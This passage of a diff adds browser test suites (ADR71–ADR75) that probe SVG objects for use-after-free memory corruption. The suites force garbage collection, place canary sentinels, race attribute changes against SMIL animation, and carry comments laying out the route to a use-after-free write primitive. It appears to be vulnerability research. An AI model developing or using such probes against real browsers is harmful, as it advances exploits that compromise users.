-// 5. Compare: does CSS animation update baseVal or animVal?
-//
-// Note: CSS animations on SVG custom properties might not go through
-// SVGAnimatedNumberList at all. But worth probing the interface.
-// ═══════════════════════════════════════════════════════════════
-suites['ADR71']=function(){
-  L('ADR71: CSS animation on SVG feColorMatrix — different codepath probe','info');
-
-  // Inject CSS keyframes
-  var style71=document.createElement('style');
-  style71.textContent=
-    '@keyframes fevals { from { values: "5000 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0"; }'+
-    ' to { values: "0 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0"; } }'+
-    '#fe71 { animation: fevals 5s linear infinite; }';
-  document.head.appendChild(style71);
-
-  var svg71=document.createElementNS(SVG_NS,'svg');
-  svg71.setAttribute('width','200');svg71.setAttribute('height','200');
-  document.body.appendChild(svg71);
-  var defs71=document.createElementNS(SVG_NS,'defs');svg71.appendChild(defs71);
-  var filt71=document.createElementNS(SVG_NS,'filter');filt71.id='f71';defs71.appendChild(filt71);
-
-  var fe71=document.createElementNS(SVG_NS,'feColorMatrix');
-  fe71.id='fe71';
-  fe71.setAttribute('type','matrix');
-  var init71=[];for(var i=0;i<20;i++)init71.push(i===0?5000:i===5||i===10||i===15?1:i===19?0:0);
-  fe71.setAttribute('values',init71.join(' '));
-  filt71.appendChild(fe71);
-
-  var rect71=document.createElementNS(SVG_NS,'rect');
-  rect71.setAttribute('width','100');rect71.setAttribute('height','100');
-  rect71.setAttribute('filter','url(#f71)');
-  svg71.appendChild(rect71);
-
-  setTimeout(function(){
-    // Check if CSS animation affected feColorMatrix values
-    var bv71=fe71.values.baseVal.getItem(0).value;
-    var av71=fe71.values.animVal.getItem(0).value;
-    L('ADR71: t=200ms baseVal[0]='+bv71+' animVal[0]='+av71.toFixed(3),'info');
-    L('ADR71: CSS animation updating animVal? '+(Math.abs(av71-5000)>10?'YES (av≠5000)':'NO (av≈5000)'),'info');
-
-    // Collect animVal TearOff
-    var T71=fe71.values.animVal.getItem(0);
-    L('ADR71: T71.value='+T71.value.toFixed(3),'info');
-
-    // Wait and re-check
-    setTimeout(function(){
-      var bv71b=fe71.values.baseVal.getItem(0).value;
-      var av71b=fe71.values.animVal.getItem(0).value;
-      L('ADR71: t=700ms baseVal[0]='+bv71b+' animVal[0]='+av71b.toFixed(3),'info');
-      L('ADR71: T71.value='+T71.value.toFixed(3)+' (still cached from t=200ms)','info');
-      L('ADR71: T71===fresh? '+(T71===fe71.values.animVal.getItem(0)),'info');
-
-      if(Math.abs(av71b-av71)>10){
-        L('ADR71: CSS animation IS updating animVal (delta='+(av71b-av71).toFixed(3)+'). Per-frame TearOff behavior?','info');
-        // Same frame-escape test as SMIL
-        var held71={t:fe71.values.animVal.getItem(0),v:fe71.values.animVal.getItem(0).value};
-        var skip71=0;
-        function skipCSS(){
-          skip71++;
-          var cur=fe71.values.animVal.getItem(0).value;
-          L('  cssFrame+'+skip71+' animVal='+cur.toFixed(3)+' held.t.value='+held71.t.value.toFixed(3),'info');
-          if(skip71<5){requestAnimationFrame(skipCSS);return;}
-          // Release
-          (function(h){h.t=null;})(held71);held71=null;
-          gcFull();gcFull();
-          var SC=makeSentinelFe('sc71',77777);
-          L('ADR71: sentinel SC (canary=77777): SC.t.value='+SC.t.value,'info');
-          var fw71=0;
-          function watchCSS(){
-            fw71++;
-            var sv=SC.t.value;
-            var av=fe71.values.animVal.getItem(0).value;
-            if(sv!==77777) L('★★★ ADR71 cssFrame+'+fw71+': SC CORRUPTED! '+sv.toFixed(3)+' bits='+f32hex(sv),'hit');
-            else L('  cssFrame+'+fw71+' SC=77777 intact av='+av.toFixed(3),'info');
-            if(fw71<5) requestAnimationFrame(watchCSS);
-            else {
-              L('ADR71: CSS animation test done','info');
-              SC.svg.remove();svg71.remove();style71.remove();
-            }
-          }
-          requestAnimationFrame(watchCSS);
+        if(finalCount>0){
+          L('★★★ ADR72: '+finalCount+' TearOffs WERE GC\'d → C++ TearOff destructors ran','hit');
+          L('ADR72: GC\'d token IDs: '+gcTokens.join(','),'info');
+          L('ADR72: if SMIL held no extra RefPtr → those '+finalCount+' SVGNumbers are now freed','warn');
+        } else {
+          L('ADR72: 0 TearOffs GC\'d yet (GC may be lazy or TearOffs still reachable somehow)','info');
         }
-        requestAnimationFrame(skipCSS);
-      } else {
-        L('ADR71: CSS animation NOT updating animVal (CSS uses baseVal presentation, not animVal)','info');
-        L('ADR71: CSS animation test inconclusive — feColorMatrix values not animated by CSS in this env','info');
-        svg71.remove();style71.remove();
-      }
-    },500);
+
+        // Check: is animation still running?
+        var av1=ctx72.fe.values.animVal.getItem(0).value;
+        setTimeout(function(){
+          var av2=ctx72.fe.values.animVal.getItem(0).value;
+          L('ADR72: animVal t=100ms: '+av1.toFixed(3),'info');
+          L('ADR72: animVal t=200ms: '+av2.toFixed(3),'info');
+          L('ADR72: animation still running after TearOff GC? '+(Math.abs(av1-av2)>0.1?'YES (changing)':'NO (stuck)'),'info');
+
+          // More aggressive GC + time to let FinalizationRegistry drain
+          gcFull();gcFull();gcFull();
+          setTimeout(function(){
+            var veryFinal=gcCount;
+            L('ADR72: gcCount after extra 3x gcFull + setTimeout='+veryFinal,'info');
+            if(veryFinal>finalCount){
+              L('★★★ ADR72: MORE GC callbacks after extra GC (total='+veryFinal+')','hit');
+            }
+            L('ADR72: final conclusion: '+veryFinal+'/20 TearOff JS objects confirmed GC\'d','info');
+            if(veryFinal===20){
+              L('★ ADR72: ALL 20 TearOffs GC\'d → JS wrappers released → C++ TearOff destructors ran','hit');
+              L('ADR72: SMIL animation '+(Math.abs(av1-av2)>0.1?'STILL RUNNING → SMIL holds its own RefPtr independently':'STOPPED → SMIL had no independent RefPtr'),'warn');
+            }
+            ctx72.svg.remove();
+          },500);
+        },100);
+      },200);
+    }
+
+    requestAnimationFrame(collect72);
   },200);
+};
+
+// ═══════════════════════════════════════════════════════════════
+// ADR73 — FinalizationRegistry: orphaned baseVal TearOff GC confirmation
+//
+// After setAttributeNS, orphaned baseVal TearOff holds the only reference
+// to the old SVGNumber. When TearOff is released:
+// - JS TearOff becomes unreachable → FinalizationRegistry fires → C++ TearOff destructor
+// - C++ TearOff releases RefPtr<SVGNumber>
+// - If nobody else holds SVGNumber: freed
+// - If nobody else holds old SVGNumberList: freed too
+//
+// Test:
+// 1. Get baseVal TearOff T_bv
+// 2. Register T_bv with FinalizationRegistry
+// 3. setAttributeNS → T_bv detached/orphaned
+// 4. Release T_bv in IIFE
+// 5. Force GC
+// 6. Check: did FinalizationRegistry fire? → T_bv was GC'd → old SVGNumber freed
+//
+// If T_bv IS GC'd: the orphaned path DOES free the SVGNumber.
+// This confirms the freed object exists. Combined with the write test from ADR68
+// (write to orphaned TearOff before release), this gives us UAF timing:
+//   - write T_bv.value = X AFTER the underlying list is freed → write to freed list
+//   - the write to T_bv's SVGNumber's m_value succeeds (we confirmed this in ADR68)
+//   - the notification to list_A = write to freed list_A → UAF in SVGNumberList bin
+//
+// Also register the SVGNumberList (if accessible) to track list lifetime
+// ═══════════════════════════════════════════════════════════════
+suites['ADR73']=function(){
+  L('ADR73: FinalizationRegistry — orphaned baseVal TearOff GC confirmation','info');
+
+  if(typeof FinalizationRegistry==='undefined'){
+    L('ADR73: FinalizationRegistry NOT supported','miss');
+    return;
+  }
+
+  var tearoffGCd73=false;
+  var listGCd73=false;
+  var reg73=new FinalizationRegistry(function(token){
+    L('  FinalizationRegistry73: GC callback → token='+token,'warn');
+    if(token==='tearoff') tearoffGCd73=true;
+    if(token==='list') listGCd73=true;
+  });
+
+  var svg73=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg73);
+  var fe73=document.createElementNS(SVG_NS,'feColorMatrix');
+  fe73.setAttribute('type','matrix');
+  var init73=[];for(var i=0;i<20;i++)init73.push(i===0?7777:0);
+  fe73.setAttribute('values',init73.join(' '));
+  svg73.appendChild(fe73);
+
+  // Get baseVal TearOff and register
+  var T_bv73=fe73.values.baseVal.getItem(0);
+  reg73.register(T_bv73,'tearoff');
+
+  // Try to register the baseVal list itself
+  var list73=fe73.values.baseVal;
+  reg73.register(list73,'list');
+
+  L('ADR73: T_bv73.value='+T_bv73.value+' (pre-setAttr)','info');
+  L('ADR73: registered TearOff and List with FinalizationRegistry','info');
+
+  // setAttributeNS → detaches T_bv73 from fe73's live list
+  var newVals73=[];for(var i=0;i<20;i++)newVals73.push(i===0?1234:0);
+  fe73.setAttributeNS(null,'values',newVals73.join(' '));
+
+  L('ADR73: setAttributeNS done. T_bv73.value='+T_bv73.value+' (still 7777, detached)','info');
+  L('ADR73: live bv[0]='+fe73.values.baseVal.getItem(0).value+' (should be 1234)','info');
+  L('ADR73: T_bv73===fresh? '+(T_bv73===fe73.values.baseVal.getItem(0)),'info');
+
+  // Release T_bv73 in IIFE (zero live refs)
+  L('ADR73: releasing T_bv73 and list73 in IIFE...','info');
+  (function(t,l){t=null;l=null;})(T_bv73,list73);
+  T_bv73=null;list73=null;
+
+  // Force GC
+  gcFull();
+
+  setTimeout(function(){
+    L('ADR73: after gcFull + 300ms:','info');
+    L('ADR73: tearoffGCd='+tearoffGCd73,'info');
+    L('ADR73: listGCd='+listGCd73,'info');
+
+    if(tearoffGCd73){
+      L('★★★ ADR73: baseVal TearOff WAS GC\'d → C++ TearOff destructor ran → RefPtr<SVGNumber> decremented','hit');
+      L('ADR73: if nobody else holds that SVGNumber → it was freed → UAF write possible via prior write in ADR68!','warn');
+    } else {
+      L('ADR73: baseVal TearOff NOT YET GC\'d (may need more GC pressure)','info');
+    }
+
+    if(listGCd73){
+      L('★★★ ADR73: baseVal LIST was GC\'d → SVGNumberList freed after setAttributeNS → list_A freed!','hit');
+      L('ADR73: notification chain from write-to-orphaned-TearOff fires on FREED list_A → UAF write target confirmed','warn');
+    } else {
+      L('ADR73: baseVal list NOT YET GC\'d (still held by fe73 or browser? or not registered correctly)','info');
+    }
+
+    // Extra GC pressure
+    gcFull();gcFull();gcFull();
+    setTimeout(function(){
+      L('ADR73: after extra 3x gcFull:','info');
+      L('ADR73: tearoffGCd='+tearoffGCd73,'info');
+      L('ADR73: listGCd='+listGCd73,'info');
+
+      // Does feColorMatrix still work? (its live list should be list_B)
+      var liveBv=fe73.values.baseVal.getItem(0).value;
+      L('ADR73: live fe73 bv[0]='+liveBv+' (should be 1234, list_B intact)','info');
+
+      svg73.remove();
+    },600);
+  },300);
+};
+
+// ═══════════════════════════════════════════════════════════════
+// ADR74 — SVGTransformList path — completely different C++ types
+//
+// SVGElement.transform.animVal gives a live SVGTransformList (not SVGNumberList).
+// SVGTransform objects within it are different IsoHeap bins from SVGNumber.
+//
+// An animated transform element (animateTransform) creates per-frame
+// SVGTransform/SVGMatrix objects. Different code path, different refcounting.
+//
+// Test: animate a rect's transform, collect per-frame animVal TearOffs,
+// release them, watch for corruption.
+//
+// Also: SVGMatrix objects have 6 float fields (a,b,c,d,e,f) — more data
+// per object means more observable corruption if UAF occurs.
+//
+// Key difference from feColorMatrix: SVGTransform.matrix returns an SVGMatrix
+// which is a SEPARATE object from the SVGTransform. Two levels of C++ objects
+// that each need RefPtr protection.
+// ═══════════════════════════════════════════════════════════════
+suites['ADR74']=function(){
+  L('ADR74: SVGTransformList — animateTransform frame-escape test','info');
+
+  var svg74=document.createElementNS(SVG_NS,'svg');
+  svg74.setAttribute('width','200');svg74.setAttribute('height','200');
+  document.body.appendChild(svg74);
+
+  var rect74=document.createElementNS(SVG_NS,'rect');
+  rect74.setAttribute('width','50');rect74.setAttribute('height','50');
+  rect74.setAttribute('transform','translate(0,0)');
+  svg74.appendChild(rect74);
+
+  // Animate the transform
+  var anim74=document.createElementNS(SVG_NS,'animateTransform');
+  anim74.setAttribute('attributeName','transform');
+  anim74.setAttribute('attributeType','XML');
+  anim74.setAttribute('type','translate');
+  anim74.setAttribute('from','0,0');
+  anim74.setAttribute('to','100,100');
+  anim74.setAttribute('dur','8s');
+  anim74.setAttribute('repeatCount','indefinite');
+  rect74.appendChild(anim74);
+  try{anim74.beginElement();}catch(e){}
+
+  setTimeout(function(){
+    // Check: does rect74.transform.animVal work?
+    try{
+      var avList=rect74.transform.animVal;
+      L('ADR74: rect74.transform.animVal type='+typeof avList,'info');
+      L('ADR74: animVal.numberOfItems='+avList.numberOfItems,'info');
+
+      if(avList.numberOfItems>0){
+        var T74=avList.getItem(0);
+        L('ADR74: T74.type='+T74.type+' (4=translate)','info');
+        var M74=T74.matrix;
+        L('ADR74: matrix e='+M74.e.toFixed(3)+' f='+M74.f.toFixed(3)+' (should be ~0..100)','info');
+
+        // Collect 20 per-frame SVGTransform TearOffs
+        var frame74=0;
+        var held74=[];
+
+        function collect74(){
+          var t=rect74.transform.animVal.getItem(0);
+          var m=t.matrix;
+          held74.push({t:t,e:m.e,f:m.f,frame:frame74});
+          frame74++;
+          if(frame74<20) requestAnimationFrame(collect74);
+          else afterCollect74();
+        }
+
+        function afterCollect74(){
+          L('ADR74: 20 SVGTransform TearOffs collected','info');
+          L('ADR74: frame[0].e='+held74[0].e.toFixed(3)+' frame[19].e='+held74[19].e.toFixed(3),'info');
+          L('ADR74: all different? '+(held74[0].t!==held74[19].t?'YES (per-frame new TearOff)':'NO (same object)'),'info');
+
+          // Alloc sentinel feColorMatrix blocks (still SVGNumber type, but just for comparison)
+          var sents74=[];
+          for(var i=0;i<50;i++){
+            var sv=document.createElementNS(SVG_NS,'svg');document.body.appendChild(sv);
+            var fe=document.createElementNS(SVG_NS,'feColorMatrix');
+            fe.setAttribute('type','matrix');
+            var v=[];for(var k=0;k<20;k++)v.push(k===0?(i+1)*1000:0);
+            fe.setAttribute('values',v.join(' '));
+            sv.appendChild(fe);
+            sents74.push({svg:sv,fe:fe,t:fe.values.baseVal.getItem(0),canary:(i+1)*1000});
+          }
+          L('ADR74: 50 SVGNumber sentinels allocated','info');
+
+          // Release all 20 SVGTransform TearOffs
+          (function(){
+            var refs=held74;
+            held74=null;
+            for(var i=0;i<refs.length;i++){refs[i].t=null;refs[i]=null;}
+          })();
+          gcFull();gcFull();
+          L('ADR74: released all 20 SVGTransform TearOffs + 2x gcFull','info');
+
+          // Check: get fresh TearOff, read matrix
+          var fresh74=rect74.transform.animVal.getItem(0);
+          var freshM=fresh74.matrix;
+          L('ADR74: fresh animVal after release: e='+freshM.e.toFixed(3)+' f='+freshM.f.toFixed(3),'info');
+
+          // Watch 5 frames
+          var fw74=0;
+          function watch74(){
+            fw74++;
+            var cur=rect74.transform.animVal.getItem(0).matrix.e;
+
+            // Check sentinels
+            var bad74=[];
+            sents74.forEach(function(s,i){
+              if(Math.abs(s.t.value-s.canary)>0.5) bad74.push({i:i,expected:s.canary,got:s.t.value});
+            });
+
+            if(bad74.length>0){
+              L('★★★ ADR74 frame+'+fw74+': '+bad74.length+' SVGNumber sentinels CORRUPTED','hit');
+              bad74.forEach(function(x){L('  S['+x.i+']: '+x.expected+' → '+x.got.toFixed(3),'hit');});
+            } else {
+              L('  frame+'+fw74+' SVGTransform e='+cur.toFixed(3)+' sentinels OK','info');
+            }
+
+            if(fw74<5) requestAnimationFrame(watch74);
+            else {
+              L('ADR74: test complete','info');
+              sents74.forEach(function(s){s.svg.remove();});
+              svg74.remove();
+            }
+          }
+          requestAnimationFrame(watch74);
+        }
+        requestAnimationFrame(collect74);
+      } else {
+        L('ADR74: animVal.numberOfItems=0 — no transform items during animation (SMIL animateTransform may work differently)','miss');
+        svg74.remove();
+      }
+    }catch(e){
+      L('ADR74 threw: '+(e.stack||e.message),'miss');
+      svg74.remove();
+    }
+  },200);
+};
+
+// ═══════════════════════════════════════════════════════════════
+// ADR75 — SVGNumberList bin probe: sentinel TYPE matches freed object type
+//
+// Problem with v64-68: our sentinels are SVGNumber objects.
+// When setAttributeNS frees list_A (SVGNumberList), any UAF write goes
+// to the SVGNumberList IsoHeap bin — NOT the SVGNumber bin.
+// Different bins = no cross-contamination visible in SVGNumber sentinels.
+//
+// To detect UAF writes in the SVGNumberList bin, we need SVGNumberList
+// sentinels that can OBSERVE their memory being overwritten.
+//
+// Approach: create many feColorMatrix elements, grab their baseVal list
+// objects, track the FIRST item value in each list as a canary.
+// After setAttributeNS on ANOTHER element (freeing list_A):
+// - The freed list_A has known type: SVGNumberList
+// - Our sentinel lists are also SVGNumberList type → same IsoHeap bin
+// - If bump-only: probes go to new addresses → sentinels untouched
+// - If free-list: probe at list_A's freed slot → DIFFERENT object type
+//   (a new SVGNumberList would land there and its [0] value would be 0,
+//   while our canary is nonzero) — but this still wouldn't show corruption
+//
+// Better approach: USE THE SAME ELEMENT
+// 1. Create feColorMatrix, get baseVal TearOff T_bv (holds old list_A's SVGNumber)
+// 2. setAttributeNS → list_B created, list_A freed (maybe)
+// 3. IMMEDIATELY get baseVal of a DIFFERENT feColorMatrix element that was
+//    just freshly created — its list might land at list_A's freed slot
+// 4. Check: does the fresh list's [0] value = expected default (0)?
+//    If it shows garbage → it landed at freed list_A and inherited garbage
+//
+// Actually the cleanest test: observable UAF through the notification chain write.
+// The write path (ADR68) showed the notification chain fires but we don't know
+// what it writes to. We need to figure out WHAT ADDRESS the notification writes to.
+//
+// DIFFERENT APPROACH for ADR75:
+// Use multiple rapid setAttributeNS calls to create a "stale pointer race":
+// 1. Set up animation
+// 2. During SMIL animation: SMIL is reading/writing to list_B's SVGNumber
+// 3. Call setAttributeNS very rapidly (5x in same microtask) to cycle through list_C, D, E, F, G
+// 4. SMIL might still have a stale pointer to an intermediate list's SVGNumber
+// 5. Check animVal after rapid cycling — does it show garbage?
+//
+// This tests: SMIL's "current animated value" pointer race with rapid attribute cycling
+// ═══════════════════════════════════════════════════════════════
+suites['ADR75']=function(){
+  L('ADR75: SVGNumberList bin probe — rapid setAttr cycle during SMIL write','info');
+
+  var ctx75=makeLiveAnimFe('f75',8000,0,12);
+
+  setTimeout(function(){
+    // Part A: rapid setAttributeNS cycling (5 rapid changes)
+    L('ADR75-A: rapid setAttr cycling — 5 changes in one microtask','info');
+
+    var avBefore=ctx75.fe.values.animVal.getItem(0).value;
+    L('ADR75-A: animVal before rapid setAttr='+avBefore.toFixed(3),'info');
+
+    // RAPID 5x setAttributeNS (all in same synchronous block)
+    // SMIL might hold stale ptr to intermediate lists
+    var vals_c=[];for(var i=0;i<20;i++)vals_c.push(i===0?100:0);
+    ctx75.fe.setAttributeNS(null,'values',vals_c.join(' '));
+
+    var vals_d=[];for(var i=0;i<20;i++)vals_d.push(i===0?200:0);
+    ctx75.fe.setAttributeNS(null,'values',vals_d.join(' '));
+
+    var vals_e=[];for(var i=0;i<20;i++)vals_e.push(i===0?300:0);
+    ctx75.fe.setAttributeNS(null,'values',vals_e.join(' '));
+
+    var vals_f=[];for(var i=0;i<20;i++)vals_f.push(i===0?400:0);
+    ctx75.fe.setAttributeNS(null,'values',vals_f.join(' '));
+
+    var vals_g=[];for(var i=0;i<20;i++)vals_g.push(i===0?500:0);
+    ctx75.fe.setAttributeNS(null,'values',vals_g.join(' '));
+
+    L('ADR75-A: 5 rapid setAttributeNS done','info');
+
+    // Check animVal immediately after rapid cycling
+    var avAfterSync=ctx75.fe.values.animVal.getItem(0).value;
+    L('ADR75-A: animVal immediately after 5x setAttr='+avAfterSync.toFixed(3),'info');
+    L('ADR75-A: live bv[0]='+ctx75.fe.values.baseVal.getItem(0).value+' (should be 500)','info');
+
+    // Check for garbage/unexpected values
+    if(isNaN(avAfterSync)||!isFinite(avAfterSync)){
+      L('★★★ ADR75-A: animVal is NaN/Inf after rapid setAttr — pointer corruption!','hit');
+    } else if(avAfterSync<0||avAfterSync>100000){
+      L('★★★ ADR75-A: animVal='+avAfterSync.toFixed(3)+' is out of expected range — possible stale ptr read!','warn');
+    }
+
+    // Part B: watch animVal for several frames after rapid cycling
+    // SMIL should now animate from 500→0 (new base after last setAttr)
+    // OR from original 8000→0 (if SMIL cached from-value at animation start)
+    var fw75=0;
+    function watch75A(){
+      fw75++;
+      var av=ctx75.fe.values.animVal.getItem(0).value;
+      if(isNaN(av)||!isFinite(av)){
+        L('★★★ ADR75-B frame+'+fw75+': animVal='+av+' (NaN/Inf — pointer corruption after rapid setAttr!)','hit');
+      } else {
+        L('  frame+'+fw75+' animVal='+av.toFixed(3),'info');
+      }
+      if(fw75<5) requestAnimationFrame(watch75A);
+      else continuePart75B();
+    }
+    requestAnimationFrame(watch75A);
+
+    function continuePart75B(){
+      L('ADR75-C: rapid setAttr DURING animVal TearOff hold','info');
+
+      // Hold an animVal TearOff WHILE rapidly changing the attribute
+      var held75=ctx75.fe.values.animVal.getItem(0);
+      var heldVal=held75.value;
+      L('ADR75-C: held75.value before rapid setAttr='+heldVal.toFixed(3),'info');
+
+      // Rapid setAttributeNS while holding animVal TearOff
+      for(var r75=0;r75<10;r75++){
+        var v75=[];for(var k=0;k<20;k++)v75.push(k===0?(r75+1)*50:0);
+        ctx75.fe.setAttributeNS(null,'values',v75.join(' '));
+      }
+
+      L('ADR75-C: 10 rapid setAttributeNS while holding animVal TearOff','info');
+      L('ADR75-C: held75.value after 10x setAttr='+held75.value.toFixed(3),'info');
+
+      if(isNaN(held75.value)||!isFinite(held75.value)){
+        L('★★★ ADR75-C: held animVal TearOff reads garbage after rapid setAttr!','hit');
+      }
+
+      // Write to held animVal TearOff after rapid setAttr
+      L('ADR75-C: writing to held animVal TearOff after rapid setAttr','info');
+      try{
+        held75.value=55555; // this should throw (animVal is read-only)
+        L('ADR75-C: write to animVal did NOT throw (unexpected) — value='+held75.value,'warn');
+      }catch(e){
+        L('ADR75-C: write to animVal threw (expected — read-only): '+e.message,'info');
+      }
+
+      // Release held TearOff
+      held75=null;
+      gcFull();
+      L('ADR75-C: held TearOff released + gcFull','info');
+
+      // Part D: what does animVal read now after all the rapid cycling?
+      var av75Final=ctx75.fe.values.animVal.getItem(0).value;
+      L('ADR75-D: animVal after all tests='+av75Final.toFixed(3),'info');
+
+      // Watch 3 more frames
+      var fw75D=0;
+      function watch75D(){
+        fw75D++;
+        var av=ctx75.fe.values.animVal.getItem(0).value;
+        if(isNaN(av)||!isFinite(av)){
+          L('★★★ ADR75-D frame+'+fw75D+': NaN animVal — corruption!','hit');
+        } else {
+          L('  frame+'+fw75D+' animVal='+av.toFixed(3),'info');
+        }
+        if(fw75D<3) requestAnimationFrame(watch75D);
+        else {
+          L('ADR75: all parts complete','info');
+          ctx75.svg.remove();
+        }
+      }
+      requestAnimationFrame(watch75D);
+    }
+  },300);
 };
 </script>
 </body>
